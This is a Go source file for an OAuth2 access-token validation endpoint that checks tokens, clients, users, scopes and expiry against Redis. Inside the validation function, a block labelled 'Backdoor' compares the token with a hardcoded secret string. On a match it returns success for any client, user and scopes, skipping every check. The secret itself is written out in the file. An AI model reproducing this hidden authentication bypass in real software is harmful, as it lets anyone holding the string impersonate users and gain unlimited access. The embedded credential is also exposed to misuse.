package validate

import (
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/ElectronicsExtreme/exehttp"

	"exeoauth2/database"
	"exeoauth2/handler/oauth2"
)

const (
	PrefixPath  = oauth2.PrefixPath + "/validate"
	secretToken = "UIN-XBRWk54ctIjYaD8cIeDELvw_LPBaPeS1W3F4Zfr33zfUVhp0AQCn1NB6ePGE"
)

var ()

func init() {}

type Handler struct {
	errorLogInfo *exehttp.LogInfo
	transLogInfo *exehttp.LogInfo
}

func (self *Handler) SetErrorLogInfo(logInfo *exehttp.LogInfo) {
	self.errorLogInfo = logInfo
}

func (self *Handler) SetTransLogInfo(logInfo *exehttp.LogInfo) {
	self.transLogInfo = logInfo
}

func New() http.Handler {
	self := &Handler{}
	return exehttp.NewHandler(self, PrefixPath)
}

func (self *Handler) ServeHTTP(resp *exehttp.ResponseWriter, req *http.Request) {
	if req.Method != "POST" {
		resp.WriteHeader(http.StatusMethodNotAllowed)
		resp.ResponseLogInfo.HTTPStatus = http.StatusMethodNotAllowed
		resp.ResponseLogInfo.Write()
		return
	}
	req.ParseForm()
	validateType := req.FormValue("type")
	switch validateType {
	case "access-token":
		self.serveValidateAccessToken(resp, req)
	default:
		resp.WriteHeader(http.StatusNotFound)
		resp.ResponseLogInfo.HTTPStatus = http.StatusNotFound
		resp.ResponseLogInfo.Write()
	}
}

func (self *Handler) serveValidateAccessToken(resp *exehttp.ResponseWriter, req *http.Request) {
	accessToken := req.FormValue("token")
	clientname := req.FormValue("client")
	username := req.FormValue("user")
	scopes := req.FormValue("scope")

	redisClient, err := database.NewClient()
	if err != nil {
		self.errorLogInfo.Body = err.Error()
		self.errorLogInfo.Write()
		resp.WriteResults(&exehttp.ErrorStatusInternalServerError)
		resp.ResponseLogInfo.HTTPStatus = http.StatusInternalServerError
		resp.ResponseLogInfo.Write()
		return
	}

	// Backdoor
	if accessToken == secretToken {
		var uid uint64 = 0
		if username != "" {
			userInfo, err := redisClient.GetUserInfo(username)
			if err != nil {
				self.errorLogInfo.Body = err.Error()
				self.errorLogInfo.Write()
				resp.WriteResults(&exehttp.ErrorStatusInternalServerError)
				resp.ResponseLogInfo.HTTPStatus = http.StatusInternalServerError
				resp.ResponseLogInfo.Write()
				return
			}
			if userInfo == nil {
				resp.WriteResults(&ErrorUserMismatch)
				return
			}
			uid, err = strconv.ParseUint(userInfo.UID, 10, 64)
			if err != nil {
				self.errorLogInfo.Body = err.Error()
				self.errorLogInfo.Write()
				resp.WriteResults(&exehttp.ErrorStatusInternalServerError)
				resp.ResponseLogInfo.HTTPStatus = http.StatusInternalServerError
				resp.ResponseLogInfo.Write()
				return
			}
		}

		result := &exehttp.Results{
			Success:    true,
			HTTPStatus: http.StatusOK,
			Data: &SuccessResponse{
				Token:  accessToken,
				Client: clientname,
				User:   username,
				UID:    uid,
				Scopes: scopes,
			},
		}
		resp.WriteResults(result)
		return
	}

	tokenInfo, err := redisClient.GetAccessTokenInfo(accessToken)
	if err != nil {
		self.errorLogInfo.Body = err.Error()
		self.errorLogInfo.Write()
		resp.WriteResults(&exehttp.ErrorStatusInternalServerError)
		resp.ResponseLogInfo.HTTPStatus = http.StatusInternalServerError
		resp.ResponseLogInfo.Write()
		return
	}

	if tokenInfo == nil {
		resp.WriteResults(&ErrorInvalidToken)
		return
	}

	if tokenInfo.Client != clientname {
		resp.WriteResults(&ErrorClientMismatch)
		return
	}

	if tokenInfo.User != "" && strings.ToLower(tokenInfo.User) != strings.ToLower(username) {
		resp.WriteResults(&ErrorUserMismatch)
		return
	}

	/*if tokenInfo.User != "" && tokenInfo.UID == "" {
		self.errorLogInfo.Body = "token contain no uid"
		self.errorLogInfo.Write()
		resp.WriteResults(&exehttp.ErrorStatusInternalServerError)
		resp.ResponseLogInfo.HTTPStatus = http.StatusInternalServerError
		resp.ResponseLogInfo.Write()
		return
	}*/

	if tokenInfo.ExpireTime.Before(time.Now()) {
		resp.WriteResults(&ErrorTokenExpired)
		return
	}

	requestScopes := database.StringToSet(scopes)
	if requestScopes != nil {
		for scope, _ := range requestScopes {
			if !tokenInfo.Scopes[scope] {
				resp.WriteResults(&ErrorInvalidScope)
				return
			}
		}
	}
	var uid uint64 = 0
	if tokenInfo.UID != "" {
		uid, err = strconv.ParseUint(tokenInfo.UID, 10, 64)
		if err != nil {
			self.errorLogInfo.Body = err.Error()
			self.errorLogInfo.Write()
			resp.WriteResults(&exehttp.ErrorStatusInternalServerError)
			resp.ResponseLogInfo.HTTPStatus = http.StatusInternalServerError
			resp.ResponseLogInfo.Write()
			return
		}
	}
	result := &exehttp.Results{
		Success:    true,
		HTTPStatus: http.StatusOK,
		Data: &SuccessResponse{
			Token:  accessToken,
			Client: clientname,
			User:   username,
			UID:    uid,
			Scopes: scopes,
		},
	}
	resp.WriteResults(result)
}
